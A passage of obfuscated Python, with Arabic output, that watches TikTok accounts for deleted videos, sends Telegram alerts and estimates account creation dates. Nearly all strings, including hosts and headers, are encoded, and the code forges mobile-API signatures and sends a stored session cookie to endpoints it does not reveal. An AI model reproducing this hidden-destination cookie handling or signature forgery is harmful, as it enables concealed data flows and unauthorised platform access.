\xd8\xb4\xd8\xb1\xd9\x8a\xd8\xb7_\xd9\x82\xd9\x88\xd8\xa9(score)\n    label = analysis[__sx__(b\'E7GgIichpmprbWppag==\', 107)]\n    color = analysis[__sx__(b\'4UNS0NXTVBDWV1ZQtpuZgxmd5g==\', 153)]\n    line4 = f\'{color}\xf0\x9f\x93\x8a \xd8\xa7\xd9\x84\xd9\x82\xd9\x88\xd8\xa9: [{bar}] {score}% \xe2\x80\x94 {label}{RESET}\'\n    line5 = f"{WHITE}\xf0\x9f\x93\x88 \xd8\xa7\xd9\x84\xd8\xaa\xd9\x81\xd8\xa7\xd8\xb9\xd9\x84 \xd8\xa7\xd9\x84\xd8\xaa\xd9\x82\xd8\xb1\xd9\x8a\xd8\xa8\xd9\x8a: {analysis[\'engagement\']}%{RESET}"\n    line6 = f"{WHITE}\xf0\x9f\x8f\xb7\xef\xb8\x8f \xd9\x81\xd8\xa6\xd8\xa9 \xd8\xa7\xd9\x84\xd9\x85\xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9\xd9\x8a\xd9\x86: {analysis[\'tier_follow\']}   \xf0\x9f\x8e\x9e\xef\xb8\x8f \xd9\x81\xd8\xa6\xd8\xa9 \xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa: {analysis[\'tier_videos\']}{RESET}"\n    badges = __sx__(b\'cNJbcNy4QAkIDxkKTQ==\', 8).join(analysis[__sx__(b\'/V/Oz8nMyqiDhY28h+I=\', 133)])\n    line7 = f\'{CYAN}\xf0\x9f\x94\x96 \xd8\xa7\xd9\x84\xd8\xb4\xd8\xa7\xd8\xb1\xd8\xa7\xd8\xaa: {badges}{RESET}\'\n    print(border)\n    print(title)\n    print(line1)\n    print(line2)\n    print(line3)\n    print(line4)\n    print(line5)\n    print(line6)\n    print(line7)\n    if enriched:\n        print(f\'{YELLOW}\xe2\x80\x94 \xd9\x85\xd8\xb9\xd9\x84\xd9\x88\xd9\x85\xd8\xa7\xd8\xaa \xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a\xd8\xa9 \xd9\x85\xd9\x86 \xd8\xb5\xd9\x81\xd8\xad\xd8\xa9 \xd8\xaa\xd9\x8a\xd9\x83 \xd8\xaa\xd9\x88\xd9\x83 \xe2\x80\x94{RESET}\')\n        try:\n            following_fmt = f"{int(enriched.get(\'followingCount\', \'0\')):,}"\n        except Exception:\n            following_fmt = enriched.get(__sx__(b\'Set6+v74+B7+/XpG/x78GjAxGt006g==\', 49), __sx__(b\'bc8mFRUVJBUk\', 21))\n        print(f\'{WHITE}\xe2\x9e\xa1\xef\xb8\x8f Following: {following_fmt}{RESET}\')\n        print(f"{WHITE}\xe2\x9c\x94\xef\xb8\x8f Verified: {enriched.get(\'verified\', \'No\')}{RESET}")\n        print(f"{WHITE}\xf0\x9f\x93\x8c Pinned Video: {enriched.get(\'pinnedVideoId\', \'None\')}{RESET}")\n        ct = enriched.get(__sx__(b\'YMJTNlJVNFEV0dRVFRVpHhg8Mhzo\', 24), __sx__(b\'/lx1TanX9k2pS82Hholihcg=\', 134))\n        print(f\'{WHITE}\xf0\x9f\x97\x93\xef\xb8\x8f Created(UTC): {ct}{RESET}\')\n    print(border)\n    _card_plain = _build_card_plain(g, nickname, country_ar, flag, bio, followers, likes, videos, analysis)\n    _mirror(_card_plain)\nDELTA_FLASH = {}\n\ndef render_countdown_numeric(total_sec, username, current_video_count):\n    if not SHOW_NUMERIC_LINE:\n        time.sleep(total_sec)\n        return\n    for remain in range(total_sec, 0, -1):\n        flash_txt = __sx__(b\'pAbf3Nzc3N0=\', 220)\n        tup = DELTA_FLASH.get(username)\n        if tup:\n            diff_val, ts = tup\n            if time.time() - ts <= 5:\n                flash_txt = f\' {GREEN}-\' + str(diff_val) + RESET\n            else:\n                DELTA_FLASH.pop(username, None)\n        line = f\'\\r{CYAN}\xd9\x81\xd8\xad\xd8\xb5 \xd8\xa8\xd8\xb9\xd8\xaf: {remain:02d}s{RESET}  {MAG}\xd8\xb9\xd8\xaf\xd8\xaf \xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa: {current_video_count}{RESET}{flash_txt}\'\n        sys.stdout.write(line)\n        sys.stdout.flush()\n        time.sleep(1)\n    sys.stdout.write(__sx__(b\'Q+HYOTs7MDsw\', 59))\n    sys.stdout.flush()\n\ndef \xd9\x81\xd8\xad\xd8\xb5_\xd9\x85\xd8\xb3\xd8\xaa\xd9\x85\xd8\xb1_\xd9\x84\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa(username):\n    time.sleep(5)\n    file_path = f\'accounts_data/{username}.txt\'\n    deleted_counter = 0\n    bearer_local = None\n    last = None\n    if os.path.exists(file_path):\n        try:\n            with open(file_path, __sx__(b\'WfsKIyEhUiFS\', 33), encoding=__sx__(b\'YsAxN1PJrxoaH/gbrw==\', 26)) as f:\n                last = int(f.read().strip() or __sx__(b\'23mQo6OjkqOS\', 163))\n        except:\n            last = None\n    while True:\n        try:\n            info_loop, bearer_local = fetch_userinfo_tikfans(username, bearer_token=bearer_local)\n            current_video_count = int(info_loop[__sx__(b\'J4V0lBMWkiiRcJJ0Xl9J0Vt+\', 95)])\n            if last is None:\n                last = current_video_count\n                with open(file_path, __sx__(b\'2niJpaKi2qLa\', 162), encoding=__sx__(b\'c9EgJkLYvgsLDukKvg==\', 11)) as f:\n                    f.write(str(current_video_count))\n            elif current_video_count < last:\n                diff = last - current_video_count\n                deleted_counter += diff\n                DELTA_FLASH[username] = (diff, time.time())\n                msg = f\'\xd8\xaa\xd9\x85 \xd8\xa5\xd8\xb2\xd8\xa7\xd9\x84\xd8\xa9 \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88 \xd9\x85\xd9\x86 \xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{username}\'\n                print(f\'{GREEN}{msg}{RESET}\')\n                send_telegram_alert(msg)\n                with open(file_path, __sx__(b\'pwX02N/fp9+n\', 223), encoding=__sx__(b\'AKJTVTGrzXh4fZp5zQ==\', 120)) as f:\n                    f.write(str(current_video_count))\n                last = current_video_count\n            elif current_video_count > last:\n                with open(file_path, __sx__(b\'03GArKur06vT\', 171), encoding=__sx__(b\'G7lITiqw1mNjZoFi1g==\', 99)) as f:\n                    f.write(str(current_video_count))\n                last = current_video_count\n            render_countdown_numeric(MONITOR_INTERVAL, username, current_video_count)\n        except Exception as e:\n            print(f\'{RED}\xe2\x9a\xa0\xef\xb8\x8f \xd8\xae\xd8\xb7\xd8\xa3 \xd8\xa3\xd8\xab\xd9\x86\xd8\xa7\xd8\xa1 \xd8\xa7\xd9\x84\xd8\xaa\xd8\xad\xd9\x82\xd9\x82 \xd8\xa7\xd9\x84\xd8\xaf\xd9\x88\xd8\xb1\xd9\x8a \xd9\x85\xd9\x86 @{username}: {e}{RESET}\')\n            render_countdown_numeric(MONITOR_INTERVAL, username, last if last is not None else 0)\n\ndef _ts_to_str(ts):\n    try:\n        ts = int(ts)\n        return time.strftime(__sx__(b\'MZMaxJ0chJwcBBgZvPkbvPwbRE9Ja/5Klg==\', 73), time.localtime(ts))\n    except:\n        return __sx__(b\'wGIDCVPebzU1so/j1xQCCUR+4rjsibI7\', 184)\n\ndef fetch_created_and_latest(username, sec_uid=None):\n    created_ts = None\n    latest_ts = None\n    try:\n        r = requests.get(__sx__(b\'x2V0l5aWlwltaJCQkGiUdnORcGr0cXBq8JN3a5CS8ZJtcHP0dLi/UziylQ==\', 191), params={__sx__(b\'hiTVMzXS0rNzMbL//u21/To=\', 254): username}, timeout=20)\n        js = r.json()\n        if js.get(__sx__(b\'VvRl4GFnKy4qJC+y\', 46)) == 0:\n            u = (js.get(__sx__(b\'3X/u7InsoaWhpaQ+\', 165)) or {}).get(__sx__(b\'zW+emPuYt7Wx2LR1\', 181)) or {}\n            created_ts = u.get(__sx__(b\'I4EQdREWdxJWkpcWXltNb19f\', 91)) or u.get(__sx__(b\'b81cOV1aO16aON7bWhIXDBMTlA==\', 23)) or None\n    except:\n        pass\n    try:\n        r2 = requests.get(__sx__(b\'oQMS8fDw8W8LDvb29g7yEBX3FgySFxYMlvURDfb0l/QL9hH29/Df2SOl1G4=\', 217), params={__sx__(b\'EbNCpKJFRSTkpiVoaXoiaq0=\', 105): username, __sx__(b\'cNJDxifFIwkIDlcKIg==\', 8): 1}, timeout=25)\n        js2 = r2.json()\n        if js2.get(__sx__(b\'GLorri8pZWBkamH8\', 96)) == 0:\n            vids = (js2.get(__sx__(b\'1Hbn5YDlqKyorK03\', 172)) or {}).get(__sx__(b\'edsqyk1IzC4HAQnmA4o=\', 1)) or []\n            if vids:\n                v = vids[0]\n                latest_ts = v.get(__sx__(b\'ethJLEhPLkuPLcvOTwcCGQYGgQ==\', 2)) or v.get(__sx__(b\'bsxdOFxbOl8b39pbExYAIhIS\', 22))\n    except:\n        pass\n    if not latest_ts and sec_uid:\n        try:\n            r3 = requests.get(__sx__(b\'9FZHpKWlpDpeW6Ojo1unRUCiQ1nHQkNZw6BEWKOhwqFeo0SjoqWKjHbwgTs=\', 140), params={__sx__(b\'50W00dIRsFLTnp+UFZ1C\', 159): sec_uid, __sx__(b\'Wftq7w7sCiAhJ34jCw==\', 33): 1}, timeout=25)\n            js3 = r3.json()\n            if js3.get(__sx__(b\'txWEAYCGys/Lxc5T\', 207)) == 0:\n                vids = (js3.get(__sx__(b\'S+l4eh96NzM3MzKo\', 51)) or {}).get(__sx__(b\'5Ea3V9DVUbOanJR7nhc=\', 156)) or []\n                if vids:\n                    v = vids[0]\n                    latest_ts = v.get(__sx__(b\'rA6f+p6Z+J1Z+x0YmdHUz9DQVw==\', 212)) or v.get(__sx__(b\'vhyN6IyL6o/LDwqLw8bQ8sLC\', 198))\n        except:\n            pass\n    return (created_ts, latest_ts)\nFAST_CREATION = True\nENABLE_DEEP_SCAN = False\nDEEP_SCAN_MAX_PAGES = 4\nSYNC_CREATION_LINE = True\nFALLBACK_QUICK_SCAN = True\nONLY_IMPROVE_UPDATES = True\n\ndef _load_sessionid_auto():\n    sid = (os.environ.get(__sx__(b\'9FaHhQWD+oGCenh7f/iNjJWNjzU=\', 140)) or __sx__(b\'WvghIiIiIiM=\', 34)).strip()\n    if sid:\n        return sid\n    p = __sx__(b\'9Vemw6CjQ0FCRsFcpiSljI2rkYjt\', 141)\n    if os.path.exists(p):\n        try:\n            with open(p, __sx__(b\'H71MZWdnFGcU\', 103), encoding=__sx__(b\'A6FQVjKoznt7fpl6zg==\', 123)) as f:\n                for line in f:\n                    s = line.strip()\n                    if s:\n                        return s\n        except:\n            pass\n    return __sx__(b\'uhjBwsLCwsM=\', 194)\nSESSIONID_AUTO = _load_sessionid_auto()\n\ndef _print_creation_line(tag_user, cr_obj):\n    created_str = _ts_to_str(cr_obj[__sx__(b\'bc8+PBMVFEgV/Q==\', 21)]) if cr_obj and cr_obj.get(__sx__(b\'JIZ3dVpcXQFctA==\', 92)) else __sx__(b\'xWcGDFbbajAwt4rm0hEHDEF7573pjLc+\', 189)\n    line = f"{WHITE}\xf0\x9f\x97\x93\xef\xb8\x8f \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 @{tag_user}: {created_str} ({(cr_obj or {}).get(\'source\') or \'unknown\'}, \xd8\xab\xd9\x82\xd8\xa9 {(cr_obj or {}).get(\'confidence\', 0)}%){RESET}"\n    sys.stdout.write(line + __sx__(b\'03FIqauroKug\', 171))\n    sys.stdout.flush()\n    _mirror(line)\n\ndef _mobile_signed_get_creation(sessionid: str, sec_user_id: str, device_region=__sx__(b\'V/VcXiovL+AvpQ==\', 47)):\n    if not sessionid or not sec_user_id:\n        return (None, __sx__(b\'Bad+fX19fXw=\', 125), 0, __sx__(b\'Cau6vF1fv706Jlk/dKOICOhYi7TYuIDUtNg0gOhYcd+EetE=\', 113))\n    try:\n        ttsign\n    except NameError:\n        return (None, __sx__(b\'VPYvLCwsLC0=\', 44), 0, __sx__(b\'ctAhIyPERsVZwsElW0ImQcbGQ0bAQw8KWLoNxg==\', 10))\n    hosts = [__sx__(b\'rA4f/P39/GIGA5v4HODmBhkf+x6ZGAWZAvn5mpn4+uWYAP8dGPodG/oHnxob0dSFQNt/\', 212), __sx__(b\'IYOScXBwce+LjhZ1kW1tipSSdpMUlYgUjxSVkHUXjnKQlXeQlneKEpeWXFl9B1fO\', 89), __sx__(b\'IIKTcHFxcO6Kjxd0kGxsixWWdxKNFY4VlJF0Fo9zkZR2kZd2ixOWl11YXIhV7w==\', 88)]\n    endpoints = [__sx__(b\'JoSNEXIRkxOLcW2KcXMQc4xZXnf7W2w=\', 94), __sx__(b\'qggBnf6dH58H/eEG/f+c/wD9+hidGR6bBx39G9Ig0k4q2HE=\', 210), __sx__(b\'rQ8GmvmaGJgA+uYH+vib+AfS1fx50OY=\', 213)]\n    base_q = {__sx__(b\'Y8EwVVaVNDZVNpHUVxobAEEfnQ==\', 27): sec_user_id, __sx__(b\'IIITEXWTFBbVd5ARdBGTd5JdWGlBXm0=\', 88): __sx__(b\'T+18+3we/fh7Njc8tjXV\', 55), __sx__(b\'qAob/9bQ0YPQMw==\', 208): __sx__(b\'50XUU9S2VVDTnp+UHp19\', 159), __sx__(b\'nz3MrMrNKSsobCisK6ri58aj4uA=\', 231): __sx__(b\'qQvi4wLiB+LS0dXy0P8=\', 209), __sx__(b\'TuwdfRsc+Pr5vXn4eX8zNhcGMzc=\', 54): __sx__(b\'SesCAwIBAgE3MTUEMAM=\', 49), __sx__(b\'wWPylZExdvJ19Ly5twy6+w==\', 185): __sx__(b\'wGJzlZV29PZ0MXcRvLivjbyL\', 184), __sx__(b\'8VPCR8FFQsJEiImCwItT\', 137): __sx__(b\'uxmIDAyMDIruC4pvx8PUw8f3\', 195), __sx__(b\'AKIztDR5eHokeVc=\', 120): __sx__(b\'gSPKzcvP//n4Dvkz\', 249), __sx__(b\'MpCBB4aBBgFnZMNlAWdghIaFwQWEBQNPSioCQv0=\', 74): __sx__(b\'dNY/Pjw+PTo8Pzw6DAwGxg35\', 12), __sx__(b\'AKJTVTAxVDH1VzNVUra0t/M3tjcxfXg353+b\', 120): __sx__(b\'bM4nJiQmJSIkJyQiFBQe3hXh\', 20), __sx__(b\'BqS1UTazVTO3Mn9+cTR9Jw==\', 126): __sx__(b\'Z8UsKy0pLiosqK8rV1NVUVZSHB8Ahxt8\', 31), __sx__(b\'8lDBw6dBxsQHRcaLipixiRc=\', 138): __sx__(b\'giDJzsjMy8/JTUrOyn5L+txF+RE=\', 250), __sx__(b\'Suj5/n4zMjBGMwU=\', 50): __sx__(b\'ftw1BgYGNwY3\', 6), __sx__(b\'njwtL6moKq/j5u5D5Jc=\', 230): __sx__(b\'1HbnYa+srZaseA==\', 172), __sx__(b\'VfcGZ2Di4eIuLSXjL6g=\', 45): device_region, __sx__(b\'/lzNqq4OSc9KzanLysmDhplhgmM=\', 134): __sx__(b\'L40cmlRXVm1Xgw==\', 87)}\n    ua = __sx__(b\'mjjnIyPo4MPy4jK9e4H//pd2RycxlAuw8o58oTRCo7V1sEpcXBV0WAANK3uh7zlkiZ0R8JAcqLCGb/h2s1LZkQv95TwjtgBJkOaP/t4oPy3sBGnabwEjIVORbBCUN/HwS2POyI+/iUDEi7LxiGG01qxPRB/9AbnBYw==\', 226)\n    for host in hosts:\n        for ep in endpoints:\n            try:\n                qstr = urlencode(base_q, doseq=True, safe=__sx__(b\'OZvyFEJBQeNBJQ==\', 65))\n                signed = ttsign(qstr, __sx__(b\'ctAJCgoKCgs=\', 10), None).get_value()\n                x_gorgon = signed.get(__sx__(b\'eduq0UzOLkvOzgIBDOACMw==\', 1)) or signed.get(__sx__(b\'Te++5UD6Gn/6+jY1ORQ3xw==\', 53)) or signed.get(__sx__(b\'6UsaQeRmnuNmZpKRm9CTww==\', 145))\n                x_khronos = signed.get(__sx__(b\'dtSl3sPAJsTBxSEIDh+ZDaQ=\', 14)) or signed.get(__sx__(b\'ddeG3fjDJcfCxiILDQKaDmc=\', 13)) or signed.get(__sx__(b\'ZsSVzuvoFuzp7REYHhLpHLQ=\', 30))\n                xss = signed.get(__sx__(b\'B6XUr1JRqVI1UqtStjOxMVJ+f1M0es0=\', 127)) or str(int(time.time() * 1000))\n                url = f\'{host}{ep}?{qstr}\'\n                headers = {__sx__(b\'AKJzVTZVqg00N7VTeXhsY3vE\', 120): ua, __sx__(b\'M5E4BwUFZmOaPoYAhQSChwBMS2DmTu4=\', 75): __sx__(b\'+FrLL0qsgICE0IE7\', 128), __sx__(b\'CKoDvr+7Oz1euby/c3Bl1XRh\', 112): __sx__(b\'XvzVaGsL9lPq7wptIyY1aiWC\', 38), __sx__(b\'5kQVTutRsdRRUZ2ekr+cbA==\', 158): x_gorgon, __sx__(b\'AaPyqYy3UbO2slZ/eXbuehM=\', 121): x_khronos, __sx__(b\'XvxV6Onp6GojJiHRJH0=\', 38): f\'sid_tt={sessionid}; sessionid={sessionid}; sessionid_ss={sessionid};\', __sx__(b\'pgRVDtPQCNOs0wrTL6ooqNPf3v+V2uw=\', 222): xss}\n                r = requests.get(url, headers=headers, timeout=18)\n                if r.status_code != 200 or not r.text:\n                    continue\n                js = r.json()\n                candidates = [js.get(__sx__(b\'BKZXUTJRfnx4EX28\', 124)) or {}, js.get(__sx__(b\'KIp7fR592p+cG5tXUENhU5s=\', 80)) or {}, (js.get(__sx__(b\'jC7f2brZBji/P/P0++L3uA==\', 244)) or {}).get(__sx__(b\'MpBhZwRnSEpOJ0uK\', 74)) or {}, (js.get(__sx__(b\'ZMY3MVIxllNVMVXQ0B0cB9QYjg==\', 28)) or {}).get(__sx__(b\'iSva3L/c8/H1nPAx\', 241)) or {}, (js.get(__sx__(b\'txWEhuOGy8/Lz85U\', 207)) or {}).get(__sx__(b\'2HqLje6NoqCkzaFg\', 160)) or {}]\n                for u in candidates:\n                    if not isinstance(u, dict):\n                        continue\n                    ct = u.get(__sx__(b\'2HrrjurtjOktj2ls7aWgu6SkIw==\', 160)) or u.get(__sx__(b\'0nDhhODnhuOnY2bnr6q8nq6u\', 170))\n                    if ct:\n                        return (int(ct), f\'mobile_signed {ep}\', 99, host)\n                nested = (js.get(__sx__(b\'Red2dBF0OT05PTym\', 61)) or {}).get(__sx__(b\'JYd2cBNwX11ZMFyd\', 93)) or {}\n                if isinstance(nested, dict):\n                    ct = nested.get(__sx__(b\'AKIzVjI1VDH1V7G0NX14Y3x8+w==\', 120)) or nested.get(__sx__(b\'bM5fOl5ZOF0Z3dhZERQCIBAQ\', 20))\n                    if ct:\n                        return (int(ct), f\'mobile_signed {ep}\', 99, host)\n            except Exception:\n                continue\n    return (None, __sx__(b\'702Ul5eXl5Y=\', 151), 0, __sx__(b\'UPJj5OF54OVn4uRhfWDlYwHg5+QDAX5gYyzaeyimqyJj\', 40))\n\ndef creation_via_mobile_signed(sec_user_id: str, sessionid: str=__sx__(b\'nT/m5eXl5eQ=\', 229), device_region=__sx__(b\'VPZfXSksLOMspg==\', 44)):\n    return _mobile_signed_get_creation(sessionid=sessionid, sec_user_id=sec_user_id, device_region=device_region)\n\ndef _creation_from_tikwm_info_quick(username):\n    try:\n        js = requests.get(__sx__(b\'/V9OraysrTNXUqqqqlKuTEmrSlDOS0pQyqlNUaqoy6hXSknOToKFaQKIrw==\', 133), params={__sx__(b\'oQPyFBL19ZRUFpXY2cqS2h0=\', 217): username}, timeout=20).json()\n        if js.get(__sx__(b\'OpgJjA0LR0JGSEPe\', 66)) == 0:\n            u = (js.get(__sx__(b\'jy28vtu+8/fz9/Zs\', 247)) or {}).get(__sx__(b\'IoBxdxR3WFpeN1ua\', 90)) or {}\n            ct = u.get(__sx__(b\'VPZnAmZhAGUh5eBhKSw6GCgo\', 44)) or u.get(__sx__(b\'1Xfmg+fggeQggmRh4KittqmpLg==\', 173))\n            if ct:\n                return (int(ct), __sx__(b\'y2mYen+dfD58f/h4tLOk3beL\', 179), 95, __sx__(b\'FrQlQCQjQidjp6Ija254Wmpq\', 110))\n    except:\n        pass\n    return (None, __sx__(b\'MJJLSEhISEk=\', 72), 0, __sx__(b\'8lCJioqKios=\', 138))\n\ndef _deep_scan_oldest(username=None, sec_uid=None, max_pages=2, pause=0.15):\n\n    def _scan(key, val):\n        oldest = None\n        cursor = 0\n        for _ in range(max_pages):\n            try:\n                r = requests.get(__sx__(b\'vhwN7u/v7nAUEenp6RHtDwroCRONCAkTieoOEunriOsU6Q7p6O/Axjy6y3E=\', 198), params={key: val, __sx__(b\'mjipLM0vyePi5L3gyA==\', 226): 200, __sx__(b\'mjipzM/ILM3g4uvw4H0=\', 226): cursor}, timeout=25)\n                js = r.json()\n                if js.get(__sx__(b\'mTuqL66o5OHl6+B9\', 225)) != 0:\n                    break\n                vids = (js.get(__sx__(b\'zG7//Zj9sLSwtLUv\', 180)) or {}).get(__sx__(b\'YcMy0lVQ1DYfGRH+G5I=\', 25)) or []\n                if not vids:\n                    break\n                for v in vids:\n                    ct = v.get(__sx__(b\'ErAhRCAnRiPnRaOmJ29qcW5u6Q==\', 106)) or v.get(__sx__(b\'3H7viu7piO2pbWjpoaSykKCg\', 164))\n                    if ct:\n                        ct = int(ct)\n                        oldest = ct if oldest is None or ct < oldest else oldest\n                nxt = (js.get(__sx__(b\'AqAxM1Yzfnp+envh\', 122)) or {}).get(__sx__(b\'Z8VUMTI10TAdHxYNHYA=\', 31))\n                if nxt is None or nxt == cursor:\n                    break\n                cursor = nxt\n                time.sleep(pause)\n            except:\n                break\n        return oldest\n    if username:\n        o = _scan(__sx__(b\'mznILijPz65uLK/i4/Co4Cc=\', 227), username)\n        if o:\n            return (o, __sx__(b\'sBLjAQTmB0WHgYXlQOcFA+Tkhc3IiO/P6A==\', 200), 70, __sx__(b\'oAITF5GR9faJ8BOUkRXf2Mfs3Bs=\', 216))\n    if sec_uid:\n        o = _scan(__sx__(b\'XP4PammqC+loJSQvrib5\', 36), sec_uid)\n        if o:\n            return (o, __sx__(b\'4UOyUFW3VhTW0NS0EbbX1FfVmJmhP58I\', 153), 70, __sx__(b\'zG5/e/39mZrlnH/4/XmztKuAsHc=\', 180))\n    return (None, __sx__(b\'+1mAg4ODg4I=\', 131), 0, __sx__(b\'uBrDwMDAwME=\', 192))\n\ndef get_account_creation_ultra(username: str, sec_uid: str=__sx__(b\'UvApKioqKis=\', 42), sessionid: str=__sx__(b\'UvApKioqKis=\', 42), deep_scan_if_missing: bool=True, max_pages: int=4):\n    ts, src, conf, notes = creation_via_mobile_signed(sec_uid or __sx__(b\'23mgo6Ojo6I=\', 163), sessionid=sessionid, device_region=__sx__(b\'zW/GxLC1tXq1Pw==\', 181))\n    if ts:\n        return {__sx__(b\'5Ue2tJudnMCddQ==\', 157): ts, __sx__(b\'Zcc20zIwV1MYHRQlH48=\', 29): src, __sx__(b\'60nYXVzYWN/aXtjdlpOF75ec\', 147): conf, __sx__(b\'8VNCQqbApI+JjwmLow==\', 137): notes}\n    ts, src, conf, notes = _creation_from_tikwm_info_quick(username)\n    if ts:\n        return {__sx__(b\'6Uu6uJeRkMyReQ==\', 145): ts, __sx__(b\'dtQlwCEjREALDgc2DJw=\', 14): src, __sx__(b\'S+l4/fx4+H96/nh9NjMlTzc8\', 51): conf, __sx__(b\'/11MTKjOqoGHgQeFrQ==\', 135): notes}\n    if deep_scan_if_missing and ENABLE_DEEP_SCAN:\n        ts, src, conf, notes = _deep_scan_oldest(username=username, sec_uid=sec_uid, max_pages=max_pages, pause=0.25)\n        if ts:\n            return {__sx__(b\'DqxdX3B2dyt2ng==\', 118): ts, __sx__(b\'+FqrTq+tys6FgIm4ghI=\', 128): src, __sx__(b\'kzGgJSSgIKeiJqCl7uv9l+/k\', 235): conf, __sx__(b\'a8nY2DxaPhUTFZMROQ==\', 19): notes}\n    return {__sx__(b\'fd8uLAMFBFgF7Q==\', 5): None, __sx__(b\'ddcmwyIgR0MIDQQ1D58=\', 13): __sx__(b\'332kp6enp6Y=\', 167), __sx__(b\'pwWUERCUFJOWEpSR2t/Jo9vQ\', 223): 0, __sx__(b\'Ref29hJ0EDs9O70/Fw==\', 61): __sx__(b\'jC739PT09PU=\', 244)}\n_CREATION_CACHE = {}\n\ndef creation_quick_line(username, sec_uid):\n    ts, src, conf, notes = _creation_from_tikwm_info_quick(username)\n    if ts:\n        cr = {__sx__(b\'0nCBg6yqq/eqQg==\', 170): ts, __sx__(b\'ZsQ10DEzVFAbHhcmHIw=\', 30): src, __sx__(b\'uxmIDQyICI+KDoiNxsPVv8fM\', 195): conf, __sx__(b\'BqS1tVE3U3h+eP58VA==\', 126): notes}\n        _CREATION_CACHE[username] = cr\n        _print_creation_line(username, cr)\n        return\n    if FALLBACK_QUICK_SCAN:\n        try:\n            ts2, src2, conf2, notes2 = _deep_scan_oldest(username=username, sec_uid=sec_uid, max_pages=2, pause=0.15)\n            if ts2:\n                cr2 = {__sx__(b\'Ppxtb0BGRxtGrg==\', 70): ts2, __sx__(b\'7028Wbi63dmSl56vlQU=\', 151): src2, __sx__(b\'mzmoLSyoKK+qLqit5uP1n+fs\', 227): conf2, __sx__(b\'xmR1dZH3k7i+uD68lA==\', 190): notes2}\n                _CREATION_CACHE[username] = cr2\n                _print_creation_line(username, cr2)\n                return\n        except:\n            pass\n    cr0 = {__sx__(b\'xWeWlLu9vOC9VQ==\', 189): None, __sx__(b\'MZNih2ZkAwdMSUBxS9s=\', 73): __sx__(b\'y2mYn37/fbWztcmxrQ==\', 179), __sx__(b\'pQeWExKWFpGUEJaT2N3LodnS\', 221): 0, __sx__(b\'O5mIiGwKbkVDRcNBaQ==\', 67): __sx__(b\'2HqjoKCgoKE=\', 160)}\n    _CREATION_CACHE[username] = cr0\n    _print_creation_line(username, cr0)\n\ndef fetch_creation_background(username, sec_uid, sessionid):\n    try:\n        prev = _CREATION_CACHE.get(username) or {}\n        had_prev_ts = bool(prev.get(__sx__(b\'G7lISmVjYj5jiw==\', 99)))\n        cr = get_account_creation_ultra(username, sec_uid=sec_uid, sessionid=sessionid, deep_scan_if_missing=ENABLE_DEEP_SCAN, max_pages=DEEP_SCAN_MAX_PAGES)\n        new_ts = cr.get(__sx__(b\'HrxNT2BmZztmjg==\', 102))\n        new_conf = cr.get(__sx__(b\'Wvhp7O1p6W5r72lsJyI0XiYt\', 34), 0)\n        should_print = True\n        should_send = True\n        if ONLY_IMPROVE_UPDATES:\n            if not new_ts and had_prev_ts:\n                should_print = False\n                should_send = False\n            if new_ts and had_prev_ts:\n                prev_conf = prev.get(__sx__(b\'ctBBxMVBwUZDx0FEDwocdg4F\', 10), 0)\n                prev_ts = prev.get(__sx__(b\'QuAREzw6O2c60g==\', 58))\n                if new_conf <= prev_conf and new_ts == prev_ts:\n                    should_print = False\n                    should_send = False\n        if new_ts and (not had_prev_ts or new_conf >= prev.get(__sx__(b\'I4EQlZQQkBcSlhAVXltNJ19U\', 91), 0) or new_ts != prev.get(__sx__(b\'9FanpYqMjdGMZA==\', 140))) or not had_prev_ts:\n            _CREATION_CACHE[username] = cr\n        if should_print:\n            created_str = _ts_to_str(new_ts) if new_ts else __sx__(b\'nT9eVA6DMmho79K+iklfVBkjv+Wx1O9m\', 229)\n            print(f"{WHITE}\xf0\x9f\x97\x93\xef\xb8\x8f (\xd8\xaa\xd8\xad\xd8\xaf\xd9\x8a\xd8\xab) \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 @{username}: {created_str} ({cr[\'source\'] or \'unknown\'}, \xd8\xab\xd9\x82\xd8\xa9 {cr[\'confidence\']}%){RESET}")\n            sys.stdout.flush()\n            _mirror(f"\xf0\x9f\x97\x93\xef\xb8\x8f (\xd8\xaa\xd8\xad\xd8\xaf\xd9\x8a\xd8\xab) \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 @{username}: {created_str} (src {cr[\'source\'] or \'unknown\'}, conf {cr[\'confidence\']}%)")\n        if should_send:\n            if new_ts or not had_prev_ts:\n                try:\n                    created_str = _ts_to_str(new_ts) if new_ts else __sx__(b\'E7HQ2oANvObmYVwwBMfR2petMWs/WmHo\', 107)\n                    send_telegram_alert(f"\xf0\x9f\x97\x93\xef\xb8\x8f (\xd8\xaa\xd8\xad\xd8\xaf\xd9\x8a\xd8\xab) @{username} \xe2\x80\x94 \xd8\xa7\xd9\x84\xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1: {created_str} (src {cr[\'source\'] or \'unknown\'}, conf {cr[\'confidence\']}%)")\n                except:\n                    pass\n    except Exception:\n        if not (_CREATION_CACHE.get(username) or {}).get(__sx__(b\'T+0cHjE3Nmo33w==\', 55)):\n            print(f\'{WHITE}\xf0\x9f\x97\x93\xef\xb8\x8f (\xd8\xaa\xd8\xad\xd8\xaf\xd9\x8a\xd8\xab) \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 @{username}: \xd8\xba\xd9\x8a\xd8\xb1 \xd9\x85\xd8\xaa\xd8\xa7\xd8\xad (error){RESET}\')\n            sys.stdout.flush()\n            _mirror(f\'\xf0\x9f\x97\x93\xef\xb8\x8f (\xd8\xaa\xd8\xad\xd8\xaf\xd9\x8a\xd8\xab) \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 @{username}: \xd8\xba\xd9\x8a\xd8\xb1 \xd9\x85\xd8\xaa\xd8\xa7\xd8\xad (error)\')\n\ndef 